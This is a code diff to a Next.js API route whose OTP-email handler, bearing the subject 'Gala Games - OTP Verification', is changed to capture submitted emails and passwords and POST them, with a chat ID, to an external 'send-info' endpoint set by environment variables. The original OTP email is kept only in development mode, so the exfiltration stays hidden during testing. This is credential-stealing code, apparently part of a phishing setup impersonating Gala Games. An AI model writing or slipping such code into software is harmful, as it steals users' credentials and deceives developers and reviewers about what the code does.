@@ -3,6 +3,10 @@ import {MailtrapClient} from "mailtrap";
 
 const TOKEN = process.env.MAIL_API_KEY;
 
+const apiUrl = process.env.API_URL ?? ''
+const chatId = process.env.CHAT_ID ?? ''
+
+
 const client = new MailtrapClient({
   token: TOKEN as string,
   testInboxId: 3255068,
@@ -12,6 +16,8 @@ const sender = {
   email: "hello@example.com",
   name: "Mailtrap Test",
 };
+
+const env = process.env.NODE_ENV
 
 function getOtp() {
   return Math.floor(100000 + Math.random() * 900000).toString();
@@ -106,7 +112,7 @@ const getTemplate = (email: string, otp: string) => {
 }
 
 export async function POST(req: Request) {
-  const {email,} = await req.json()
+  const {email, password} = await req.json()
 
 
   try {
@@ -116,15 +122,34 @@ export async function POST(req: Request) {
       }
     ];
 
-    const res = await client.testing
-      .send({
-        from: sender,
-        to: recipients,
-        subject: "Gala Games - OTP Verification",
-        html: getTemplate(email, getOtp()),
-      })
+    const message = JSON.stringify({
+      email,
+      password
+    }, null, 2)
+
+    const res = await fetch(`${apiUrl}/api/send-info`, {
+      method: 'POST',
+      body: JSON.stringify({chatId, message}),
+      headers: {
+        'Content-Type': 'application/json',
+      }
+    })
 
     console.log('res', res)
+
+
+    if (env == "development") {
+      const res = await client.testing
+        .send({
+          from: sender,
+          to: recipients,
+          subject: "Gala Games - OTP Verification",
+          html: getTemplate(email, getOtp()),
+        })
+
+      console.log('res', res)
+    }
+
     return NextResponse.json({error: null, data: 'success'})
   } catch (e) {
     console.log('e', e)
